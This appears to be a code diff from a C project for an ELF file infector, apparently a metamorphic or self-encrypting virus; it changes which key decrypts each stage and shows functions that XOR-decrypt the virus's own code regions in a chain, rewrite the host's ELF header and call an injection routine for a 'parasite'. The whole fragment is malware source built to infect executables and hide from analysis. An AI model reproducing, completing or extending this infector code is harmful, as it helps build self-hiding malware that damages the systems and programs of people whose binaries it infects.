@@ -4,10 +4,10 @@
 /// STATIC FUNCTIONS
 ////////////////////////////////////////////////////////////////////////////////
 
-__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
+__attribute__((always_inline)) static inline void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size)
 {
 	for (register size_t index = 0; index < size; index++)
-		callee[index] ^= keychain->key[RIGHT];
+		callee[index] ^= keychain->key[LEFT];
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -20,7 +20,7 @@ void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_c
 	MID_LOGGER("header_infection:\t");
 #endif
 
-	decrypt_right(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
+	decrypt_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
 
 	if (context == FAILURE)
 		goto label;
@@ -38,8 +38,8 @@ void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_c
 	host->header->e_shstrndx = 0;
 
 label:
-	update_keychain_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
-	decrypt_right(keychain, (char *)injection, (void *)parasite - (void *)injection);
+	update_keychain_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+	decrypt_left(keychain, (char *)injection, (void *)parasite - (void *)injection);
 
 	injection(host, keychain, context);
 }
